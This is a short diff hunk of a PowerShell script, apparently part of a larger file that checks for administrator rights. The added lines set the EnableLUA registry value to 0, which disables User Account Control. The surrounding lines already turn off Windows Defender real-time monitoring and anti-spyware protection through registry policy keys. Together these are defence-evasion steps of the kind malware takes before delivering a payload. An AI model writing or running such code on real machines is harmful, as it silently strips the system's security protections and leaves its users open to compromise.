@@ -18,6 +18,10 @@ if (-not $isAdmin) {
     }
 }
 
+$uacPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
+$uacProperty = "EnableLUA"
+Set-ItemProperty -Path $uacPath -Name $uacProperty -Value 0
+
 Set-MpPreference -DisableRealtimeMonitoring $true
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Force
 New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "Real-Time Protection" -ErrorAction SilentlyContinue
